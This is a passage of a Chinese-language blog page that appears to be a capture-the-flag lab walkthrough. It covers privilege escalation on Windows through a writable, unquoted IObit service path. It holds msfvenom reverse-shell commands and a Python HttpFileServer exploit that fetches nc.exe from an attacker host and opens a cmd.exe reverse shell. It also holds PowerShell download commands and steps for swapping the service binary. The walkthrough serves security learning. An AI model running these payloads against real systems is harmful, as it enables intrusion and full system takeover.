+: C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exeModifiablePath : @{
+ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName
+: LocalSystemAbuseFunction  : Write-ServiceBinary -Name &#39;AdvancedSystemCareService9&#39; -Path &lt;HijackPath&gt;CanRestart
+: TrueName
+: AdvancedSystemCareService9Check
+: Unquoted Service Paths## 解释- **ServiceName**：服务名称是 &quot;AdvancedSystemCareService9&quot;。
+- **Path**：该服务的路径是 &quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot;。
+- **ModifiablePath**：这里提到的可修改路径指的是 &quot;C:&quot;，而且该路径上的权限是授予 &quot;BUILTIN\Users&quot; 组的，具有“追加数据/添加子目录”的权限。这意味着系统中的普通用户组可能对这个路径具有一定的写权限。
+- **StartName**：服务是以 &quot;LocalSystem&quot; 账户启动的。这是 Windows 中权限最高的账户之一，通常用于系统服务。&quot;StartName&quot; 表示服务启动时所使用的用户账户。在这个描述中，它指定了服务是以 &quot;LocalSystem&quot; 账户启动的。&quot;LocalSystem&quot; 是 Windows 中的一个内置账户，拥有系统最高的权限。这意味着该服务在启动时具有系统级别的权限，可以执行许多操作，包括访问系统资源和执行系统级任务，而不受用户权限限制。
+- **AbuseFunction**：该字段描述了一种潜在的滥用方式，即通过 `Write-ServiceBinary` 命令向这个服务的路径写入二进制文件。这种滥用可能导致恶意程序被注入到服务中。
+- **CanRestart**：表示该服务可以重新启动。
+- **Check**：描述这个服务存在的潜在风险是 &quot;Unquoted Service Paths&quot;，即未加引号的服务路径。这可能导致路径混淆，并被恶意攻击利用。
+</code></pre>
+<blockquote>
+<p>根据服务的信息收集来看我们已经 找到了 一个可以写的路径</p>
+</blockquote>
+<h3>载荷投递</h3>
+<h5>载荷生成</h5>
+<p>msf生成木马</p>
+<p><a href="msfvenom.md#Encoders%20%E7%BC%96%E7%A0%81">Encoders 编码</a></p>
+<pre><code class="language-shell">### 先看一下系统信息systeminfoSystem Boot Time:
+4/27/2024, 1:07:47 AMSystem Manufacturer:
+XenSystem Model:
+HVM domUSystem Type:
+x64-based PC### 生成木马msfvenom  -p windows/x64/shell_reverse_tcp  LHOST=10.11.69.232 LPORT=4444  -f exe-service -o Advanced.exe## 首先先要 暂停服务## 服务暂停之后 才能对这个文件进行替换当前路径:C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.execd &quot;C:\Program Files (x86)\IObit\Advanced SystemCare\&quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exeMove-Item -Path &quot;C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe&quot; -Destination &quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot;sc start  相对服务的名字 直接get shell
+</code></pre>
+<h3>非MSF 启动(非集成化脚本)</h3>
+<h4>httpfileserver</h4>
+<blockquote>
+<p><a href="https://www.exploit-db.com/exploits/39161">先找到exp</a><br>修改 个人ip 和 端口</p>
+</blockquote>
+<pre><code class="language-python">
+import urllib2
+import sys
+try:	
+def script_create():		urllib2.urlopen(&quot;http://&quot;+sys.argv[1]+&quot;:&quot;+sys.argv[2]+&quot;/?search=%00{
+.+&quot;+save+&quot;.}
+&quot;)	
+def execute_script():		urllib2.urlopen(&quot;http://&quot;+sys.argv[1]+&quot;:&quot;+sys.argv[2]+&quot;/?search=%00{
+.+&quot;+exe+&quot;.}
+&quot;)	
+def nc_run():		urllib2.urlopen(&quot;http://&quot;+sys.argv[1]+&quot;:&quot;+sys.argv[2]+&quot;/?search=%00{
+.+&quot;+exe1+&quot;.}
+&quot;)	ip_addr = &quot;10.11.69.232&quot; #local IP address	local_port = &quot;9001&quot; # Local Port number	vbs = &quot;C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F&quot;+ip_addr+&quot;%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with&quot;	save= &quot;save|&quot; + vbs	vbs2 = &quot;cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs&quot;	exe= &quot;exec|&quot;+vbs2	vbs3 = &quot;C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20&quot;+ip_addr+&quot;%20&quot;+local_port	exe1= &quot;exec|&quot;+vbs3	script_create()	execute_script()	nc_run()
+except:	pr
+int &quot;&quot;&quot;[.]Something went wrong..!	Usage is :[.] python exploit.py &lt;Target IP address&gt;  &lt;Target Port Number&gt;	Don&#39;t forgot to change the Local IP address and Port number on the script&quot;&quot;&quot;
+</code></pre>
+<h3>脚本利用</h3>
+<h5>第一次</h5>
+<blockquote>
+<p>脚本向我们本地的web 服务器 请求 nc.exe</p>
+</blockquote>
+<h5><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503193856.png" alt="image.png">第二次</h5>
+<blockquote>
+<p>脚本向目标 弹一个反向shell回来</p>
+</blockquote>
+<p>下载 nc.exe 并且 搭建web服务</p>
+<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240503193856.png" alt="image.png"></p>
+<h3>Get_System</h3>
+<blockquote>
+<p>今天继续找一个自动化信息收集脚本 winpeas</p>
+</blockquote>
+<p>windwos 提权</p>
+<p><a href="%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%ACWinpeas">自动化脚本Winpeas</a></p>
+<blockquote>
+<p>使用web服务器将exe传送到 目标机器<br>直接运行</p>
+</blockquote>
+<pre><code class="language-shell">Interesting Services -non Microsoft-� Check 
+if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
+AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
+File Permissions: bill [WriteData/CreateFiles]
+Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])
+Advanced SystemCare Service
+</code></pre>
+<blockquote>
+<p>依旧是 这个 文件<br>服务 我们可以直接 创建一个exe来替代他</p>
+</blockquote>
+<h3>载荷投递</h3>
+<pre><code class="language-shell">msfvenom  -p windows/x64/shell_reverse_tcp  LHOST=10.11.69.232 LPORT=4444  -f exe-service -e x86/shikata_ga_nai  -o ASCService.exe
+</code></pre>
+<blockquote>
+<p>停止服务 AdvancedSystemCareService9<br>sc stop AdvancedSystemCareService9<br>直接删除可执行文件ASCService.exe<br>直接上传我们的自定义<br>ASCService.exe</p>
+</blockquote>
+<pre><code class="language-powershell">powershell -c Invoke-WebRequest -Uri &quot;http://10.11.69.232:8080/ASCService.exe&quot; -OutFile &quot;ASCService.exe&quot;  
+</code></pre>
+<h3>get_system</h3>
+<blockquote>
+<p>sc start AdvancedSystemCareService9</p>
+</blockquote>
+<p>开启监听 nc -nvlp 4444</p>
+<h3>总结</h3>
+<blockquote>
+<p>这个靶场还是比较简单的 主要是 使用了两种方式让你学会如何利用软件进入 一台机器</p>
+</blockquote>
+
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // Search Logic
+        const searchInput = document.getElementById('searchInput');
+        const searchResults = document.getElementById('searchResults');
+        
+        // Focus shortcut
+        document.addEventListener('keydown', (e) => {
+            if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+                e.preventDefault();
+                searchInput.focus();
+            }
+        });
+
+        let searchIndex = [];
+
+        // Load Index
+        fetch('/search.json')
+            .then(res => res.json())
+            .then(data => {
+                searchIndex = data;
+            });
+
+        searchInput.addEventListener('input', (e) => {
+            const query = e.target.value.toLowerCase();
+            if (query.length < 2) {
+                searchResults.style.display = 'none';
+                return;
+            }
+
+            const results = searchIndex.filter(item => 
+                item.title.toLowerCase().includes(query) || 
+                (item.content && item.content.toLowerCase().includes(query))
+            ).slice(0, 8); // Limit to 8
+
+            if (results.length > 0) {
+                searchResults.innerHTML = results.map(item => `
+                    <a href="${item.link}" class="search-result-item">
+                        <div class="search-result-title">📄 ${item.title}</div>
+                        <div class="search-result-meta">${item.date} · ${item.category}</div>
+                    </a>
+                `).join('');
+                searchResults.style.display = 'block';
+            } else {
+                searchResults.innerHTML = '<div style="padding:1rem;color:#9ca3af;text-align:center;">无搜索结果</div>';
+                searchResults.style.display = 'block';
+            }
+        });
+
+        // Close search on outside click
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.search-container')) {
+                searchResults.style.display = 'none';
+            }
+        });
+
+        // Sidebar Logic Enhanced
+        document.addEventListener('DOMContentLoaded', function() {
+            const currentPath = window.location.pathname;
+            
+            // 1. Highlight Active Link & Open Parent
+            const navLinks = document.querySelectorAll('.nav-item');
+            navLinks.forEach(link => {
+                let href = link.getAttribute('href');
+                // Normalize paths for comparison (remove trailing slashes, ignoring domain)
+                if (href && currentPath.indexOf(href) !== -1 && href !== '/') {
+                    link.classList.add('active');
+                    
+                    // Open all parents
+                    let parent = link.closest('details');
+                    while (parent) {
+                        parent.open = true;
+                        parent = parent.parentElement.closest('details');
+                    }
+                }
+            });
+
+            // 2. Preserve Sidebar Scroll Position
+            const sidebar = document.querySelector('.nav-group');
+            if (sidebar) {
+                const storedScroll = localStorage.getItem('sidebarScroll');
+                if (storedScroll) {
+                    sidebar.scrollTop = storedScroll;
+                }
+                
+                // Save scroll on click or before unload
+                window.addEventListener('beforeunload', () => {
+                    localStorage.setItem('sidebarScroll', sidebar.scrollTop);
+                });
+            }
+
+            // 3. User Experience: Keep manually opened folders open? 
+            // Optional: for now, the "Active Link" logic is usually enough for navigation.
+            // If user wants manual persistence, we need IDs for every details element.
+        });
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-cpp.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+</body>
+</html>
